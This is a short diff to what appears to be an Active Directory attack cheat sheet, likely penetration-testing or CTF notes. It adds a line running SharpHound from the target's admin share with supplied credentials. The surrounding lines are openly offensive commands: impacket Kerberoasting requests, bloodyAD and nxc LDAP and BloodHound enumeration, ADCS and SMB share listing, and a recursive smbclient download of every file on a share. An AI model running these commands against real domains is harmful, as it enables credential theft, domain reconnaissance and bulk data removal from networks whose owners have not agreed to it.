@@ -219,6 +219,7 @@ impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile us
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile computers
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(description=*))" --attr description
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --bloodhound --use-kcache
+//$TARGET/$/Sharphound.exe --ldapusername $USERNAME --ldappassword $PASSWORD
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs --use-kcache
 nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' --shares --use-kcache
 mkdir smb; smbclient //$TARGET/SHARE_NAME -U '$USERNAME'%'$PASSWORD' -D . -c 'lcd smb; recurse; prompt; mget *'
